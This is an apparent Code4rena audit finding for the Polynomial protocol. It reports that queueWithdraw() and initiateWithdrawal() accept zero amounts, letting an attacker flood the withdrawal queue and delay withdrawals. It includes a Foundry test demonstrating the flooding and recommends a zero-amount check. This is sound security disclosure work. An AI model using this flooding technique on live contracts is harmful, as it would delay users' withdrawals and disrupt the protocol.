# Original link
https://github.com/code-423n4/2023-03-polynomial-findings/issues/122
# Lines of code

https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L264
https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L284
https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L227
https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L269


# Vulnerability details

## Impact

The [queueWithdraw()](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L264) function helps to the user to queue his withdrawals and the [processWithdraws()](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L284) function helps to process all the users withdrawals.

The problem here is that the attacker can flood the [withdrawalQueue](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L271) with zero amounts, causing the ```processWithdraws()``` cost more gas to process the user withdrawals. The same behaivour is happening in the [KangarooVault.sol::initiateWithdrawal()](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L227).

The withdrawals can be delayed by the attacker which generates mistrust in the protocol to the users.

## Proof of Concept

I created a test in ```LiquidityPool.Deposits.t.sol``` where it is possible to flood the ```withdrawalQueue``` with zero amount via the ```queueWithdraw()``` function.

```solidity
function testZeroQueueWithdraw() public {
    // It is possible to flood the withdrawalQueue with zero amounts in the queueWithdraw()
    // causing a DOS in the processWithdraws()
    //
    // 1. Deposit some money in order to have totalFunds
    //
    susd.mint(user_2, 1e20);
    vm.startPrank(user_2);
    susd.approve(address(pool), 1e20);
    pool.deposit(69e18, user_2);
    vm.stopPrank();
    //
    // 2. Call queueWithdraw with zero withdraw amount
    //
    pool.queueWithdraw(0, user_1);
    pool.queueWithdraw(0, user_2);
    pool.queueWithdraw(0, user_3);
    pool.queueWithdraw(0, address(1337));
    //
    // 3. Assert queuedWithdrawalHead() and nextQueuedWithdrawalId()
    //
    assertEq(pool.queuedWithdrawalHead(), 1);
    assertEq(pool.nextQueuedWithdrawalId(), 5);
    //
    // 4. Call processWithdraws()
    //
    vm.warp(block.timestamp + pool.minWithdrawDelay());
    pool.processWithdraws(1);
    //
    // 5. Assert the increase of queuedWithdrawalHead()
    //
    assertEq(pool.queuedWithdrawalHead(), 2);
}
```

## Tools used

VScode

## Recommended Mitigation Steps

Check the zero amount value in the ```LiquidityPool.sol::queueWithdraw()``` and ```KangarooVault.sol::initiateWithdrawal()``` functions.